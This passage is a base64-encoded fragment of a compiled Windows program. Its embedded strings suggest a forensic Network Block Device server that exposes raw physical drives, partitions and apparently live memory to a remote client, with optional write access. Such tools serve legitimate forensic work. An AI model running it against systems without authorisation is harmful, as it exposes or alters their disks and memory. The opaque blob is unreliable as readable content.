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CAtdyAgICAgRW5hYmxlIHdyaXRpbmcgKGRpc2FibGVkIGJ5IGRlZmF1bHQpAAAAACAtZCAgICAgRW5hYmxlIGRlYnVnIG1lc3NhZ2VzAAAAIC1xICAgICBCZSBRdWlldC4ubm8gbWVzc2FnZXMAAAAgLWggICAgIFRoaXMgaGVscCB0ZXh0AABbKl0gAAAAAFsrXSAAAAAAWy1dIAAAAABDb25uZWN0aW9uIGRyb3BwZWQuIEVycm9yOiAlbHUAAG9wZW5pbmcgbWVtb3J5AABvcGVuaW5nIGZvciB3cml0aW5nAG9wZW5pbmcgcmVhZC1vbmx5AAAARXJyb3Igb3BlbmluZyBmaWxlICVzOiAldQAAAFxcLlxQSFlTSUNBTERSSVZFAAAAQ2Fubm90IG9idGFpbiBkcml2ZSBsYXlvdXQ6ICV1AABSZXF1ZXN0IG5vIGlvIGJvdW5kYXJ5IGNoZWNrcyBmYWlsZWQuIEVycm9yOiAldQBCb3VuZGFyeSBjaGVja3MgdHVybmVkIG9mZi4ARGlza0xlbmd0aDogJWxsZAAAAABDYW5ub3QgZGV0ZXJtaW5lIERpc2sgbGVuZ3RoLiBFcnJvcjogJXUAVGFyZ2V0aW5nIG9ubHkgcGFydGl0aW9uICVkAFBhcnRpdGlvbiAlZCBpcyBvZiB0eXBlICUwMngAAAAAT2Zmc2V0OiAlbGxkICglbGx4KQBMZW5ndGg6ICVsbGQgKCVsbHgpAFxcLlwAAAAAVm9sdW1lTGVuZ3RoOiAlbGxkAABDYW5ub3QgZGV0ZXJtaW5lIFZvbHVtZSBsZW5ndGguIEVycm9yOiAldQAAAEZhaWxlZCB0byBzZXQgYWNxdWlzaXRpb24gbW9kZS4ARmFpbGVkIHRvIGdldCBtZW1vcnkgZ2VvbWV0cnkuAABDUjM6IDB4JTAxMGxsWCAlZCBtZW1vcnkgcmFuZ2VzOgAAAABTdGFydCAweCUwOGxsWCAtIExlbmd0aCAweCUwOGxsWAAAAABGYWlsZWQgdG8gb2J0YWluIGZpbGVzaXplIGluZm86ICV1AABOZWdvdGlhdGluZy4uLnNlbmRpbmcgTkJETUFHSUMgaGVhZGVyAAAATkJETUFHSUMAAAAARmFpbGVkIHRvIHNlbmQgbWFnaWMgc3RyaW5nAEZhaWxlZCB0byBzZW5kIDJuZCBtYWdpYyBzdHJpbmcuAAAAAEZhaWxlZCB0byBzZW5kIGZpbGVzaXplLgAAAABGYWlsZWQgdG8gc2VuZCBhIGNvdXBsZSBvZiAweDAwcwAAAABTdGFydGVkIQAAAABGYWlsZWQgdG8gcmVhZCBmcm9tIHNvY2tldC4Ad3JpdGU6AAByZWFkAAAAAFJlcXVlc3Q6ICVzIEZyb206ICVsbGQgTGVuOiAlbHUgAAAAAFVuZXhwZWN0ZWQgcHJvdG9jb2wgdmVyc2lvbiEgKGdvdDogJWx4LCBleHBlY3RlZDogMHgyNTYwOTUxMykAAABJbnZhbGlkIHJlcXVlc3Q6IEZyb206JWxsZCBMZW46JWx1AABGYWlsZWQgdG8gc2VuZCBlcnJvciBwYWNrZXQgdGhyb3VnaCBzb2NrZXQuAFRlcm1pbmF0aW5nIGNvbm5lY3Rpb24gZHVlIHRvIEludmFsaWQgcmVxdWVzdDogRnJvbTolbGxkIExlbjolbHUAAAAARXJyb3Igc2Vla2luZyBpbiBmaWxlICVzIHRvIHBvc2l0aW9uICVsbGQgKCVsbHgpOiAldQAAAABTZW5kaW5nIGVycm5vPSVkAAAAAEZhaWxlZCB0byBzZW5kIGVycm9yIHN0YXRlIHRocm91Z2ggc29ja2V0LgAAcmVjdiBtYXggJWQgYnl0ZXMAAABXcml0ZUZpbGUgJWQgYnl0ZXMgb2YgJWQgYnl0ZXMgaW4gYnVmZmVyAAAAAEZhaWxlZCB0byB3cml0ZSAlZCBieXRlcyB0byAlczogJXUAAEJsb2NrIHNpemUgaW5jb25zaXN0ZW5jeTogJWQAAAAAQ29ubmVjdGlvbiB3YXMgZHJvcHBlZCB3aGlsZSByZWNlaXZpbmcgZGF0YS4AAAAARmFpbGVkIHRvIHNlbmQgdGhyb3VnaCBzb2NrZXQuAABTZW5kaW5nIHBhZDogJWxsZCwlZAAAAABTZW5kaW5nIG1lbTogJWxsZCwlZAAAAABGYWlsZWQgdG8gcmVhZCBmcm9tICVzOiAlbHUARmFpbGVkIHRvIHJlYWQgZnJvbSAlczogJXUAAENvbm5lY3Rpb24gZHJvcHBlZCB3aGlsZSBzZW5kaW5nIGJsb2NrLgBDbG9zZWQgc29ja2V0LgAAVW5leHBlY3RlZCBjb21tYW5kdHlwZTogJWQAAEZhaWxlZCB0byBjbG9zZSBoYW5kbGU6ICV1AABjOnA6ZjpuOmh3ZHEAAAAAYWxsAGRlYnVnLmxvZwAAAEZpbGUgb3BlbmVkLCB2YWxpZCBmaWxlAEVycm9yIG9wZW5pbmcgZmlsZTogJXMAAEVycm9yIGluaXRpYWxpemluZyB3aW5zb2NrLmRsbAAAQ291bGRuJ3Qgb3BlbiBzb2NrZXQuLnF1aXR0aW5nLgBFcnJvciBzZXR0aW5nIG9wdGlvbnMgJXUAAAAAQ291bGQgbm90IGJpbmQgc29ja2V0IHRvIHNlcnZlcgBFcnJvciBsaXN0ZW5pbmcgb24gc29ja2V0AAAATGlzdGVuaW5nLi4uAAAAAEluaXQgc29ja2V0IGxvb3AAAAAAQ29ubmVjdGlvbiBtYWRlIHdpdGg6ICVzAAAAAEludmFsaWQgU29ja2V0AABzdHJpbmcgdG9vIGxvbmcAaW52YWxpZCBzdHJpbmcgcG9zaXRpb24AdmVjdG9yPFQ+IHRvbyBsb25nAABiYWQgY2FzdAAAAAA4cEAAEBBAAAhNQAAAAAAAuG9AAMA9QACwMkAAwDJAANAyQABANUAArlZAANA1QAAgNkAAqFZAAKJWQADAOEAAwDlAALA6QABAO0AAgDtAAAhuQADwPUAAAAAAAGgAAABwbUAAMD1AAAAAAABgAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGJBAAMBwQAAVAAAAAAAAAAAAAAAAAAAAAJBAADxtQAAAAAAAAAAAAAEAAABMbUAAVG1AAAAAAAAAkEAAAAAAAAAAAAD/////AAAAAEAAAAA8bUAAAAAAAGAAAAAAAAAAbJBAAIRtQAAAAAAAAAAAAAUAAACUbUAA7G1AAKxtQAC8bkAAoG5AAIRuQAAAAAAAMJBAAAMAAAAAAAAA/////wAAAABAAAAAyG1AAAAAAAAAAAAABAAAANhtQACsbUAAvG5AAKBuQACEbkAAAAAAAGyQQAAEAAAAAAAAAP////8AAAAAQAAAAIRtQAAAAAAAaAAAAAAAAABUkUAAHG5AAAAAAAAAAAAABQAAACxuQACcb0AARG5AALxuQACgbkAAhG5AAAAAAAAYkUAAAwAAAAAAAAD/////AAAAAEAAAABgbkAAAAAAAAAAAAAEAAAAcG5AAERuQAC8bkAAoG5AAIRuQAAAAAAAqJBAAAAAAAAIAAAAAAAAAAQAAABAAAAATG9AAMSQQAABAAAAAAAAAAAAAAAEAAAAQAAAABRvQADgkEAAAgAAAAAAAAAAAAAABAAAAFAAAADYbkAAAAAAAAAAAAADAAAA6G5AAIBvQAD4bkAAMG9AAAAAAADEkEAAAQAAAAAAAAD/////AAAAAEAAAAAUb0AAAAAAAAAAAAACAAAAJG9AAPhuQAAwb0AAAAAAAKiQQAAAAAAACAAAAP////8AAAAAQAAAAExvQAAAAAAAAAAAAAEAAABcb0AAZG9AAAAAAACokEAAAAAAAAAAAAD/////AAAAAEAAAABMb0AA4JBAAAIAAAAAAAAA/////wAAAABAAAAA2G5AAFSRQAAEAAAAAAAAAP////8AAAAAQAAAABxuQAAAAAAAAAAAAAAAAADMkUAAzG9AAAAAAAAAAAAAAgAAANxvQAAccEAA6G9AAAAAAACQkUAAAAAAAAAAAAD/////AAAAAEAAAAAEcEAAAAAAAAAAAAABAAAAFHBAAOhvQAAAAAAAzJFAAAEAAAAAAAAA/////wAAAABAAAAAzG9AAAAAAAAAAAAAAAAAAGiSQABMcEAAAAAAAAAAAAACAAAAXHBAAJxwQABocEAAAAAAAAiSQAAAAAAAAAAAAP////8AAAAAQAAAAIRwQAAAAAAAAAAAAAEAAACUcEAAaHBAAAAAAABokkAAAQAAAAAAAAD/////AAAAAEAAAABMcEAAAAAAAAAAAAA5UgAAWVcAAIhXAAC5VwAA+lcAADpYAABoWAAAmFgAAMBYAADoWAAAGFkAAElZAACiWQAAy1kAAAxaAABiWgAAjFoAALxaAADrWgAAVFsAAJxbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAKxNQAAAAAAA/v///wAAAADQ////AAAAAP7///+oT0AAvE9AAAAAAAD+////AAAAAMz///8AAAAA/v///4FSQACqUkAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAAdTQAAAAAAA/v///wAAAADY////AAAAAP7////rVEAA/lRAAP////9QV0AAIgWTG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W1zZ19leGl0AABjAV9fZ2V0bWFpbmFyZ3MA3AFfY2V4aXQAACoCX2V4aXQALQFfWGNwdEZpbHRlcgBzBWV4aXQAAGQBX19pbml0ZW52ALACX2luaXR0ZXJtALECX2luaXR0ZXJtX2UA7AFfY29uZmlndGhyZWFkbG9jYWxlAKIBX19zZXR1c2VybWF0aGVycgAA6wFfY29tbW9kZQAARQJfZm1vZGUAAJ8BX19zZXRfYXBwX3R5cGUAAPsBX2NydF9kZWJ1Z2dlcl9ob29rAAAhAl9leGNlcHRfaGFuZGxlcjRfY29tbW9uAAIBP3Rlcm1pbmF0ZUBAWUFYWFoA7gA/X3R5cGVfaW5mb19kdG9yX2ludGVybmFsX21ldGhvZEB0eXBlX2luZm9AQFFBRVhYWgAAuAJfaW52b2tlX3dhdHNvbgAA7wFfY29udHJvbGZwX3MAAEUBPz9fNz8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQDZCQAAAmgE/X0JBRE9GRkBzdGRAQDNfSkIAAKcCP2NvdXRAc3RkQEAzVj8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEAxQEEAAJUCP2NlcnJAc3RkQEAzVj8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEAxQEEAAI4CP19Yb3V0X29mX3JhbmdlQHN0ZEBAWUFYUEJEQFoAngA/PzFfTG9ja2l0QHN0ZEBAUUFFQFhaAABgAD8/MF9Mb2NraXRAc3RkQEBRQUVASEBaAIwCP19YbGVuZ3RoX2Vycm9yQHN0ZEBAWUFYUEJEQFoADQY/dW5jYXVnaHRfZXhjZXB0aW9uQHN0ZEBAWUFfTlhaANIBP19HZXRnbG9iYWxsb2NhbGVAbG9jYWxlQHN0ZEBAQ0FQQVZfTG9jaW1wQDEyQFhaAACoAT9fRmlvcGVuQHN0ZEBAWUFQQVVfaW9idWZAQFBCREhIQFoAAP8DP2lkQD8kY29kZWN2dEBEREhAc3RkQEAyVjBsb2NhbGVAMkBBAABCAT8/Xzc/JGJhc2ljX2lzdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEA2QkAAAMgFP3NwdXRuQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFX0pQQkRfSkBaAACwAT9fR2V0Y2F0QD8kY29kZWN2dEBEREhAc3RkQEBTQUlQQVBCVmZhY2V0QGxvY2FsZUAyQFBCVjQyQEBaAFMCP19Pc2Z4QD8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRVhYWgAA9gE/X0luaXRAPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBJQUVYWFoAAJEFP3NldGdAPyRiYXNpY19